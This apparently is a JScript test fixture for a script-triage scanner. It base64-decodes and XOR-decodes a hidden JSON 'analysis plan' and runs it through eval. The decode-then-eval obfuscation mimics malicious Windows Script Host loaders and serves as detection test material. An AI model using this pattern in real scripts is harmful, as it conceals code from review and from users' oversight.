// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_67aa0b4d = function decode_67aa0b4d_body(storedMaterial) {
  var keyBytes = [143,126,36,78,56];
  var recoveredMaterial = [];
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ keyBytes[i % keyBytes.length]); }
  return recoveredMaterial;
};
var recover_d0277dfd = function recover_d0277dfd_body() {
  var packedText = "9FxXOl3/DQZ0Y60SSy1Z+xt7IlfsH0hsFK0OVitI7gxBEUz9H0o9XuoMBmIa+g5IIVnrIVYrVeAKQWxlo1xFKln/CkE8GrVccydWxwpQPhbY" + "F0oGTPsOditJ+htXOha6UBVsFK0IRSJN6g0GdEOtHUUjSO4XQyBn5hoGdBrsH0k+WeYZSmMJtxxHfFm+GhF9GqNcUTxUrUQGJkz7Dld0F6BP" + "HCxbvR8VKg28UEE2WeIOSCsW5hBSL1TmGgssCb4aQHkP7VBAL0ytUgY7S+oMey9f6hBQbAKtNlEgTP0bVz107hwLfwDtHRYvCetLF2wUrRhN" + "Il3QDkU6UK1EBg0C0yJxPV39DXgSaPocSCdb0yJsO1b7DEE9S8MfRhJk/ApFKV2iTxwsW70fFSoNvFBAL0ytAwhsS/sfQyt74AtKOhq1TVk=";
  var storedMaterial = decodeBase64(packedText);
  var harmlessValue = ["north", "south"].join(":");
  var invoke = function(block, value) { return block.call(null, value); };
  var recoveredMaterial = invoke.call(null, decode_67aa0b4d, storedMaterial);
  var configurationText;
  configurationText = recoveredMaterial.length ? String.fromCharCode(recoveredMaterial[0]) : "";
  for (var bi = 1; bi < recoveredMaterial.length; bi++) { configurationText = configurationText.concat(String.fromCharCode(recoveredMaterial[bi])); }
  return configurationText;
};
var inspect_0907feba = function inspect_0907feba_body() {
  var configuration = eval("(" + recover_d0277dfd.call(null) + ")");
  var analysisPlan = new Object();
  analysisPlan.steps = configuration.steps;
  analysisPlan.adapter = configuration.adapter;
  analysisPlan.values = configuration.values;
  analysisPlan.stageCount = configuration.stageCount;
  return analysisPlan;
};
